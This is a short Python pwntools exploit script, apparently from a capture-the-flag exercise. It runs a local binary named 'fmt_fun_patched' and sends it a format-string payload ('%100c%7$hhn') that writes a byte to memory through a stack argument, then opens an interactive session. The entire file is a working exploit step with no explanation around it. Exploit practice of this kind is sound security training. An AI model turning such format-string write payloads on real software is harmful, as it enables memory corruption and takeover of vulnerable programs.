#!/usr/bin/env python3

from pwn import *

elf = ELF("fmt_fun_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

p = elf.process()
raw_input("DEBUG")

payload = b"%100c"
payload += b"%7$hhn"

p.sendline(payload)

p.interactive()

